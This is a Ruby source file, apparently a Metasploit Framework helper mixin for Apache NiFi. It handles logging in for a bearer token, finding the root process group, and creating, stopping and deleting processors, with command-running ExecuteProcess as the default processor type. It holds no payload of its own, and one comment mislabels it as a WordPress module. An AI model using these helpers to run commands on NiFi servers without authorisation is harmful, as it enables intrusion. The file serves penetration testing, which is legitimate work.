# -*- coding: binary -*-

module Msf
  class Exploit
    class Remote
      module HTTP
        # This module provides a way of interacting with wordpress installations
        module Nifi
          include Msf::Exploit::Remote::HttpClient

          def initialize(info = {})
            super

            register_options(
              [
                Msf::OptString.new('USERNAME', [false, 'Username to authenticate with']),
                Msf::OptString.new('PASSWORD', [false, 'Password to authenticate with']),
                Msf::OptString.new('BEARER-TOKEN', [false, 'JWT authenticate with']),
              ], Msf::Exploit::Remote::HTTP::Nifi
            )
          end

          # Checks the API response to see if its what is expected and returns a valid result.
          #
          # @param description [String] The description of what is being checked
          # @param response [String] The response to check
          # @param expected_response_code [Int] HTTP Response code that is expected
          # @param item [Int] The item in the JSON blob that is needed
          # @return the value of the item from the JSON blob from the response
          def check_response(description, response, expected_response_code, item = '')
            # Check that response was received
            fail_with(Msf::Module::Failure::Unreachable, "Unable to retrieve HTTP response from API when #{description}") unless response
            # Check that response code was expected
            if response.code != expected_response_code
              fail_with(Msf::Module::Failure::UnexpectedReply,
                        "Unexpected HTTP response code from API when #{description} " \
                        "(received #{response.code}, expected #{expected_response_code})")
            end
            # Check that item can be retrieved
            return if item.empty?

            body = response.get_json_document
            unless body.key?(item)
              fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to retrieve #{item} from HTTP response when #{description}")
            end
            body[item]
          end

          # Determines if the Apache Nifi instance supports login.
          #
          # @return the value of supportsLogin from the server
          def supports_login
            response = send_request_cgi({
              'method' => 'GET',
              'uri' => normalize_uri(target_uri.path, 'access', 'config')
            })
            config = check_response('GETting access configuration', response, 200, 'config')
            config['supportsLogin']
          end

          # Fetch the root process group's UUID
          #
          # @param token [String] The bearer token from a valid login
          # @return [String] The UUID of the root process group
          def fetch_root_process_group(token)
            opts = { 'method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'process-groups', 'root') }
            opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
            response = send_request_cgi(opts)
            check_response('GETting root process group', response, 200, 'id')
          end

          # Creates a processor in a process group
          #
          # @param token [String] The bearer token from a valid login
          # @param process_group [String] UUID of a processor group
          # @param type [String] What type of processor to create
          # @return [String] The UUID of the root process group
          def create_processor(token, process_group, type = 'org.apache.nifi.processors.standard.ExecuteProcess')
            body = {
              'component' => { 'type' => type },
              'revision' => { 'version' => 0 }
            }
            opts = {
              'method' => 'POST',
              'uri' => normalize_uri(target_uri.path, 'process-groups', process_group, 'processors'),
              'ctype' => 'application/json',
              'data' => body.to_json
            }
            opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
            response = send_request_cgi(opts)
            check_response("POSTing new processor in process group #{process_group}", response, 201, 'id')
          end

          # Get a processor in a process group
          #
          # @param token [String] The bearer token from a valid login
          # @param processor [String] UUID of a processoror
          # @param field [String] the key from the JSON blob to return
          # @return [String] THe value from the specified field
          def get_processor(token, processor, field = 'id')
            opts = {
              'method' => 'GET',
              'uri' => normalize_uri(target_uri.path, 'processors', processor)
            }
            opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
            response = send_request_cgi(opts)
            check_response("GETting processor #{processor}", response, 200, field)
          end

          # Delete a processor
          #
          # @param token [String] The bearer token from a valid login
          # @param processor [String] UUID of the processes
          # @param version [Int] The version number to delete
          def delete_processor(token, processor, version = 0)
            opts = {
              'method' => 'DELETE',
              'uri' => normalize_uri(target_uri.path, 'processors', processor),
              'vars_get' => { 'version' => version }
            }
            opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
            response = send_request_cgi(opts)
            # if we tried to delete the old revision, go ahead and delete the newer one
            # arbitrary version limit of 20
            while response.code == 400 && response.body.include?('is not the most up-to-date revision') && version <= 20
              version += 1
              vprint_status("Found newer revision of #{processor}, attempting to delete version #{version}")
              opts['vars_get'] = { 'version' => version }
              response = send_request_cgi(opts)
            end

            check_response("DELETEting processor #{processor}", response, 200)
          end

          # Stop processor
          #
          # @param token [String] The bearer token from a valid login
          # @param processor [String] UUID of the processes
          def stop_processor(token, processor)
            body = {
              'revision' => {
                'clientId' => 'x',
                'version' => 1
              },
              'state' => 'STOPPED'
            }
            opts = {
              'method' => 'PUT',
              'uri' => normalize_uri(target_uri.path, 'processors', processor, 'run-status'),
              'ctype' => 'application/json',
              'data' => body.to_json
            }
            opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
            response = send_request_cgi(opts)
            check_response("PUTting processor #{processor} stop command", response, 200)

            # Stop may not have worked (but must be done first). Terminate threads now
            opts = {
              'method' => 'DELETE',
              'uri' => normalize_uri(target_uri.path, 'processors', processor, 'threads')
            }
            opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
            response = send_request_cgi(opts)
            check_response("DELETEing processor #{processor} terminate threads command", response, 200)
          end

          # Attempts a login with username and password to retrieve a bearer token for APIs
          #
          # @return [String] The bearer token on successful login
          def retrieve_login_token
            response = send_request_cgi(
              {
                'method' => 'POST',
                'uri' => normalize_uri(target_uri.path, 'access', 'token'),
                'vars_post' => {
                  'username' => datastore['USERNAME'],
                  'password' => datastore['PASSWORD']
                }
              }
            )
            check_response('POSTing credentials', response, 201)
            response.body
          end
        end
      end
    end
  end
end
